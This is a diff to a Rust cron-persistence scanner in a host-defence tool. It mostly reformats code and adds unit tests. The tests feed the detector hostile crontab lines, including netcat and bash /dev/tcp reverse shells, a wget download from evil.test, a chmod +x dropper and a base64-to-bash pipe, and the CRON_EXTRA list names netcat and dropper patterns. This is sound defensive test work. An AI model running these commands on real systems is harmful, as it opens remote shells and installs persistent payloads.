@@ -10,16 +10,18 @@
 use std::os::unix::fs::{MetadataExt, PermissionsExt};
 use std::path::{Path, PathBuf};
 
+use crate::core::scan::{
+    effective_line, read_text_file, references_untrusted_dir, suspicious_matches,
+};
 use crate::core::{
     DefenderContext, DefenderError, Finding, Result, Severity, Verdict, require_root,
 };
-use crate::core::scan::{effective_line, read_text_file, references_untrusted_dir, suspicious_matches};
 
 /// Additional patterns that are specifically relevant in cron contexts but are
 /// not included in the shared suspicious-pattern set.
 const CRON_EXTRA: &[(&str, &str)] = &[
-    ("nc -",     "netcat connection"),
-    ("nohup",    "background execution detached from terminal"),
+    ("nc -", "netcat connection"),
+    ("nohup", "background execution detached from terminal"),
     ("chmod +x", "make-executable (stage two of a dropper)"),
 ];
 
@@ -126,11 +128,19 @@ fn scan_crontab_file(ctx: &DefenderContext, path: &Path) {
             .with_context("patterns", reasons.join(", "))
             .with_context("removed", removed.to_string())
             .with_verdict(
-                if removed { Verdict::Remove } else { Verdict::Investigate },
+                if removed {
+                    Verdict::Remove
+                } else {
+                    Verdict::Investigate
+                },
                 format!(
                     "Line matched suspicious pattern(s) [{}]. {}.",
                     reasons.join(", "),
-                    if removed { "Removed from file" } else { "Manual removal required" },
+                    if removed {
+                        "Removed from file"
+                    } else {
+                        "Manual removal required"
+                    },
                 ),
             ),
         );
@@ -203,7 +213,11 @@ fn scan_cron_d_file(ctx: &DefenderContext, path: &Path) {
             .with_context("patterns", reasons.join(", "))
             .with_context("removed", removed.to_string())
             .with_verdict(
-                if removed { Verdict::Remove } else { Verdict::Investigate },
+                if removed {
+                    Verdict::Remove
+                } else {
+                    Verdict::Investigate
+                },
                 format!(
                     "Cron.d entry matched suspicious pattern(s) [{}]. \
                      Files in /etc/cron.d run as any user; this entry should not exist.",
@@ -286,7 +300,11 @@ fn scan_periodic_dir(ctx: &DefenderContext, dir: &Path) {
                     .with_context("uid", meta.uid().to_string())
                     .with_context("removed", removed.to_string())
                     .with_verdict(
-                        if removed { Verdict::Remove } else { Verdict::Investigate },
+                        if removed {
+                            Verdict::Remove
+                        } else {
+                            Verdict::Investigate
+                        },
                         "Periodic scripts in /etc/cron.* must be owned by root and not \
                          world-writable. This script fails that check and is a persistence risk \
                          regardless of its current content.",
@@ -353,13 +371,21 @@ fn scan_periodic_dir(ctx: &DefenderContext, dir: &Path) {
             .with_context("patterns", reasons.join(", "))
             .with_context("removed", removed.to_string())
             .with_verdict(
-                if removed { Verdict::Remove } else { Verdict::Investigate },
+                if removed {
+                    Verdict::Remove
+                } else {
+                    Verdict::Investigate
+                },
                 format!(
                     "Periodic script contains suspicious pattern(s) [{}]. \
                      Scripts in this directory execute automatically on a schedule. \
                      The file was {}.",
                     reasons.join(", "),
-                    if removed { "removed" } else { "NOT removed — manual action required" },
+                    if removed {
+                        "removed"
+                    } else {
+                        "NOT removed — manual action required"
+                    },
                 ),
             ),
         );
@@ -415,7 +441,10 @@ mod tests {
     fn wget_into_tmp_is_flagged() {
         let r = matched_patterns("*/5 * * * * wget http://evil.test/x -O /tmp/x");
         assert!(!r.is_empty());
-        assert!(r.iter().any(|s| s.contains("world-writable") || s.contains("remote content")));
+        assert!(
+            r.iter()
+                .any(|s| s.contains("world-writable") || s.contains("remote content"))
+        );
     }
 
     #[test]
@@ -484,5 +513,64 @@ mod tests {
             .filter(|s| s.as_str() == "execution from world-writable directory")
             .count();
         assert_eq!(count, 1);
+    }
+
+    #[test]
+    fn netcat_is_flagged() {
+        // CRON_EXTRA: "nc -" pattern
+        let r = matched_patterns("* * * * * nc -e /bin/bash 192.168.1.1 4444");
+        assert!(!r.is_empty());
+        assert!(r.iter().any(|s| s.contains("netcat")));
+    }
+
+    #[test]
+    fn chmod_plus_x_is_flagged() {
+        // CRON_EXTRA: "chmod +x" pattern
+        let r = matched_patterns("@reboot chmod +x /var/tmp/payload && /var/tmp/payload");
+        assert!(!r.is_empty());
+        assert!(r.iter().any(|s| s.contains("executable")));
+    }
+
+    #[test]
+    fn clean_backup_script_is_not_flagged() {
+        // Ensure a realistic legitimate entry produces no findings.
+        assert!(matched_patterns("0 3 * * * root /usr/local/bin/backup.sh").is_empty());
+        assert!(matched_patterns("*/15 * * * * www-data /usr/bin/php /var/www/cron.php").is_empty());
+    }
+
+    #[test]
+    fn openssl_decode_is_flagged() {
+        let r = matched_patterns("* * * * * echo abc | openssl enc -d -base64 | bash");
+        assert!(!r.is_empty());
+    }
+
+    #[test]
+    fn reverse_shell_via_bash_tcp_is_flagged() {
+        let r = matched_patterns(
+            "* * * * * bash -i >& /dev/tcp/192.168.1.1/4444 0>&1",
+        );
+        assert!(!r.is_empty());
+    }
+
+    #[test]
+    fn perl_reverse_shell_is_flagged() {
+        let r = matched_patterns(
+            "* * * * * perl -e 'use Socket; ...'",
+        );
+        assert!(!r.is_empty());
+        assert!(r.iter().any(|s| s.contains("inline interpreter")));
+    }
+
+    #[test]
+    fn effective_line_trims_whitespace() {
+        assert_eq!(
+            effective_line("  * * * * * /usr/bin/backup.sh  "),
+            Some("* * * * * /usr/bin/backup.sh"),
+        );
+    }
+
+    #[test]
+    fn effective_line_rejects_comment_regardless_of_leading_space() {
+        assert!(effective_line("  # disabled cron entry").is_none());
     }
 }
